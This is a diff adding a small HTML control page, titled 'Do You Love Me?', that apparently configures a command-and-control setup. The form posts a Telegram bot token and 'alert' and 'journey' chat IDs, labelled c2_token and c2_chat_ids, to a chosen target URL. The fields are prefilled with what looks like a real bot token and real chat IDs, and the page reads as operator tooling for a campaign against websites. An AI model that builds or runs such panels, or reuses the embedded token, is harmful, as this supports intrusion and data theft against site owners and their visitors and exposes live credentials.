@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Do You Love Me?</title>
+    <style>
+        body { font-family: monospace; background-color: #1e1e1e; color: #d4d4d4; padding: 40px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 500px; background-color: #252526; padding: 30px; border-radius: 8px; border: 1px solid #37373d; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
+        h2 { color: #00aaff; text-align: center; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid #37373d; padding-bottom: 15px; }
+        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 4px; border: 1px solid #3c3c3c; background-color: #313131; color: #d4d4d4; box-sizing: border-box; font-size: 14px; }
+        input[type="submit"] { width: 100%; background-color: #007acc; color: #ffffff; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px; transition: background-color 0.2s; }
+        input[type="submit"]:hover { background-color: #00aaff; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #cccccc; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Do You Love Me?</h2>
+        <form id="runnerForm" method="POST" target="_blank">
+            <label for="target_url">URL</label>
+            <input type="url" id="target_url" name="target_url" placeholder="https://www.target.com/path/to/filename.crst" required>
+
+            <label for="c2_token">Token:</label>
+            <input type="text" id="c2_token" value="8425271441:AAG1jRA0d62wAKkTln7-u9VSPIZ0ZcG4M6Y" name="c2_token" placeholder="Token 8425271443..." required>
+            
+            <label for="c2_chat_ids_alert">>>! Chat IDs:</label>
+            <input type="text" id="c2_chat_ids_alert" value="-5092755700" name="c2_chat_ids_alert" placeholder="-123459382, -3xxxxxx, ..." required>
+
+            <label for="c2_chat_ids_journey">>>> Chat IDs:</label>
+            <input type="text" id="c2_chat_ids_journey" name="c2_chat_ids_journey" value="-5042256960" placeholder="-123459382, -3xxxxxx, ..." required>
+            
+            <input type="submit" value="Start The Game!">
+        </form>
+    </div>
+    <script>
+        document.getElementById('runnerForm').addEventListener('submit', function(event) {
+            this.action = document.getElementById('target_url').value;
+        });
+    </script>
+</body>
+</html>
